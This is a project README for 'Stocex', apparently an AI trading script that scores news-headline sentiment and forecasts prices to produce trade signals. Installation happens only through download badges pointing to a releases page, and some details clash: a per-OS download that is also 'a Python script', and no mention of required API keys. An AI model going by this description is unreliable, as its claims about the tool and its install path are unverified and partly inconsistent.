---
layout: "default"
title: "🧠 Algorithmic-Trading-AI - Smart Trading Made Simple"
description: "🧠 Enhance your trading strategy with Stocex, an AI tool that analyzes market news, scores sentiment, and generates actionable trade signals."
---
# 🧠 Algorithmic-Trading-AI - Smart Trading Made Simple

<p align="center">
  <a href="https://github.com/FluffyFF/Algorithmic-Trading-AI/releases">
    <img src="https://img.shields.io/badge/Download%20Now-blue.svg" alt="Download Now" />
  </a>
</p>

## 🧩 What is Stocex?

**Stocex** is a lightweight yet powerful Python script that scans daily financial headlines, scores their sentiment using FinBERT, detects affected stocks, fetches intraday price data, forecasts future prices using TimeGPT, and generates actionable trade signals.

## ⚙️ How It Works

> 🧠 Just run one script and everything happens automatically.

### 🔁 Pipeline Overview

1. **Fetch News (via NewsAPI):**  
   Get yesterday’s market headlines from Bloomberg, WSJ, CNBC, etc.

2. **Sentiment Scoring (FinBERT):**  
   Use HuggingFace FinBERT to score each headline (positive, neutral, negative).

3. **Company Detection (spaCy):**  
   Extract mentioned companies using Named Entity Recognition (NER).

4. **Ticker Mapping:**  
   Match extracted companies with their stock tickers.

5. **Intraday Price Data:**  
   Fetch current stock prices for the detected tickers.

6. **Price Forecasting (TimeGPT):**  
   Use TimeGPT to predict future stock prices.

7. **Trade Signals:**  
   Generate buy or sell signals based on the collected data.

## 🚀 Getting Started

Here’s how to download and run **Stocex** on your computer.

### 🖥️ System Requirements

- Windows 10 or higher, macOS, or Linux
- Python 3.8 or higher (Don’t worry, it can be installed easily)
- Internet connection for fetching news and data

### 📥 Download & Install

1. **Visit the Releases Page:**  
   Go to the [Releases page](https://github.com/FluffyFF/Algorithmic-Trading-AI/releases) to download the latest version.

2. **Download the Application:**  
   Look for the latest release and click on the download link for your operating system. This file will be a compact Python script.

3. **Install Python (if necessary):**  
   If you don’t have Python installed, [download Python here](https://www.python.org/) and follow the instructions for your operating system.

4. **Run the Script:**  
   Open your terminal or command prompt, navigate to the folder where you downloaded Stocex, and type:
   ```
   python Stocex.py
   ```
   The script will begin fetching news and processing data automatically.

## 📊 Usage

Once you run the script, it will:

- Collect last day’s headlines.
- Analyze the sentiment of those headlines.
- Identify relevant companies.
- Forecast stock prices and suggest trades.

## 🔍 Troubleshooting

**Error: "Python not recognized"**  
Make sure you have Python installed and added to your system PATH.

**Issue: No Stocks Detected**  
Ensure the news headlines contain valid stock references. Try running again after a market day for better results.

## 📜 Contributing

This project welcomes contributions. If you have ideas for improvements or new features, feel free to submit a pull request.

## 📧 Support

For any questions or support, you can open an issue on the GitHub repository. 

## 📝 License

This project is licensed under the MIT License. You can freely use and modify it as you please.

## 🌟 Acknowledgments

Thanks to the developers who created the libraries and tools that make this application possible, including FinBERT and TimeGPT.

<p align="center">
  <a href="https://github.com/FluffyFF/Algorithmic-Trading-AI/releases">
    <img src="https://img.shields.io/badge/Download%20Now-blue.svg" alt="Download Now" />
  </a>
</p>